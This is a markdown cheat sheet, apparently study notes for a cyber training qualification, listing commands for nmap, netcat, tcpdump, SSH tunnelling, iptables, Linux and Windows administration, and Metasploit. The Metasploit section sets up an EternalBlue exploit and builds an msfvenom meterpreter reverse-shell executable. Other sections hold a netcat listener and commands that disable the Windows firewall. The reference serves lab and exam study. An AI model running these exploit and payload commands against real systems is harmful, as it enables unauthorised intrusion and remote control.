---
tags: [cyber, cheatsheet]
jqr: "Dense command reference across all tools"
---

# Command Cheat Sheet

Just the commands. Concepts and gotchas live in [Exam-Day Quick Reference](Exam-Day%20Quick%20Reference.md), and each tool has its own full note.

## Nmap · [Nmap](../Recon%20Tools/Nmap.md)
```bash
nmap -sn 192.168.1.0/24                 # host discovery (ping sweep)
sudo nmap -sS 192.168.1.20              # SYN scan (root), top 1000
sudo nmap -sS -p- 192.168.1.20          # all 65535 TCP ports
sudo nmap -sV -sC -p 22,80,445 192.168.1.20   # versions + default scripts
sudo nmap -sU --top-ports 20 192.168.1.20      # UDP
sudo nmap -A 192.168.1.20               # OS + version + scripts + traceroute
nmap --script vuln -p 80,443 192.168.1.20      # vuln NSE scripts
sudo nmap -sS -p- -oA scan 192.168.1.20        # save all 3 formats
```

## Netcat / telnet · [Netcat](../Recon%20Tools/Netcat.md)
```bash
nc -lvnp 4444                            # listen (verbose, no-dns, port)
nc 192.168.1.20 4444                     # connect
nc -zv 192.168.1.20 20-25                # port scan a range
nc 192.168.1.20 80                       # banner grab (then type: HEAD / HTTP/1.0)
nc -lvnp 4444 > in.file  /  nc host 4444 < out.file   # file transfer
telnet 192.168.1.20 25                   # banner grab (cleartext, legacy)
```

## Tcpdump · [Tcpdump](../Recon%20Tools/Tcpdump.md)
```bash
sudo tcpdump -i eth0 -n                  # capture, no DNS
sudo tcpdump -i eth0 host 192.168.1.20 and port 80
sudo tcpdump -i eth0 -A port 4444        # ASCII payload (see cleartext)
sudo tcpdump -i eth0 -w cap.pcap   /  tcpdump -r cap.pcap
```

## Connections / interfaces · [Interfaces IPs and Routing](../Linux%20Admin/Interfaces%20IPs%20and%20Routing.md) · [Processes and systemd](../Linux%20Admin/Processes%20and%20systemd.md)
```bash
ip -br addr ; ip a ; ifconfig -a         # my IPs
ip route ; ip route get 1.1.1.1          # routes
ss -tulpn ; netstat -tulpn               # listening + PID
who ; w ; lsof -u sam ; lsof -i :80      # users / open files
ping -c3 host ; traceroute host ; mtr host
```

## SSH / SCP · [SSH - Tunneling and Jump Hosts](../SSH%20Kali/SSH%20-%20Tunneling%20and%20Jump%20Hosts.md) · [SCP](../SSH%20Kali/SCP.md)
```bash
ssh -p 2222 user@host                    # non-standard port
ssh -J bastion internal-host             # jump
ssh -L 8080:127.0.0.1:80 user@bastion    # local forward
ssh -R 9000:127.0.0.1:3000 user@remote   # remote forward
ssh -D 1080 user@bastion                 # SOCKS proxy (pivot)
ssh user@'fe80::1%eth0'                   # IPv6 link-local
scp -P 2222 file user@host:/tmp/         # capital -P for scp
scp -r dir user@host:/tmp/               # whole directory
scp user@'[2001:db8::1]':/f .            # IPv6 (brackets)
```

## Firewall (iptables) · [iptables](../IP%20Tables%20CentOS/iptables.md)
```bash
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -P INPUT DROP                                   # LAST
sudo iptables -t nat -A POSTROUTING -s 10.10.10.0/24 -o eth0 -j MASQUERADE
sudo iptables -L -n -v --line-numbers ; sudo iptables -S
sudo iptables-save > /etc/iptables/rules.v4                  # Debian/Ubuntu
sudo service iptables save                                    # CentOS
```

## Processes / services · [Processes and systemd](../Linux%20Admin/Processes%20and%20systemd.md)
```bash
top ; htop ; ps aux ; ps -ef
kill -9 <PID> ; killall name ; pkill -f pattern
systemctl start|stop|enable|disable|restart|status <svc>
systemctl list-units --type=service ; journalctl -u <svc> -xe
```

## Packages · [Package Management](../Linux%20Admin/Package%20Management.md)
```bash
sudo apt update && sudo apt install nmap ; apt download nmap
sudo dnf install nmap ; dnf download nmap
dpkg -i f.deb ; dpkg -l ; dpkg -L pkg ; dpkg -S /path
rpm -ivh f.rpm ; rpm -qa
python3 -m venv venv && source venv/bin/activate && pip install requests
```

## Files / search / perms · [Files Search and Permissions](../Linux%20Admin/Files%20Search%20and%20Permissions.md)
```bash
find / -name '*.conf' -type f 2>/dev/null
find . -type f -mtime -1 -exec grep -l TERM {} +
grep -rin "pattern" /etc ; grep -Eo "[0-9.]+" f
chmod 750 f ; chmod -R 755 dir ; chown -R sam:sam dir
tar czf a.tgz dir ; tar xzf a.tgz ; xz f ; 7z a a.7z dir ; zip -r a.zip dir
```

## Disks / mounts · [Disks Mounts and fstab](../Linux%20Admin/Disks%20Mounts%20and%20fstab.md)
```bash
lsblk ; sudo mount -t cifs //192.168.1.20/data /mnt/x -o username=sam,vers=3.0
sudo fsck /dev/sdb1            # on an UNMOUNTED fs
# /etc/fstab:  //host/share  /mnt/x  cifs  credentials=/root/.cred,_netdev  0  0
```

## cron · [cron](../Linux%20Admin/cron.md)
```bash
crontab -e ; crontab -l
@reboot        /path/script.sh
*/5 * * * *    /path/script.sh        # min hour dom mon dow
```

## Windows CLI / PowerShell · [Windows CLI and net Commands](../Win%20Admin/Windows%20CLI%20and%20net%20Commands.md) · [PowerShell Essentials](../Win%20Admin/PowerShell%20Essentials.md)
```bat
net user  /  net user labuser P@ss /add  /  net localgroup admins labuser /add
net share data=C:\data /GRANT:labuser,FULL  /  net use Z: \\192.168.1.20\data
icacls C:\file  /  icacls C:\file /grant labuser:F  /  icacls C:\dir /T /reset
tasklist  /  taskkill /PID 123 /F  /  systeminfo  /  ipconfig /all  /  getmac
netsh advfirewall set allprofiles state off
```
```powershell
Get-LocalUser ; New-LocalUser labuser ; Get-SmbShare ; New-SmbShare -Name data -Path C:\data
Get-Process ; Stop-Process -Id 123 -Force ; Get-CimInstance Win32_Process | select Name,ExecutablePath
Set-NetFirewallProfile -All -Enabled False ; New-NetIPAddress -IP 10.10.10.5 -PrefixLength 24 -InterfaceIndex 12
```

## Metasploit · [Metasploit Workflow](../C2%20Frameworks/Metasploit/Metasploit%20Workflow.md)
```
sudo msfdb init ; msfconsole ; db_status
search type:exploit cve:2017-0144 ; use 0 ; use auxiliary/scanner/smb/smb_version
show options ; show advanced ; show payloads
set RHOSTS 192.168.1.20 ; set LHOST 192.168.1.10 ; set LPORT 4444
set SMB::ProtocolVersion 2,3 ; set payload windows/x64/meterpreter/reverse_tcp
run   (or)  exploit ; sessions -i 1
```
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o s.exe
searchsploit apache 2.4
```

## Related
- [Exam-Day Quick Reference](Exam-Day%20Quick%20Reference.md) · [Master Index (MOC)](Master%20Index%20%28MOC%29.md) · [JQR Progress Checklist](JQR%20Progress%20Checklist.md)
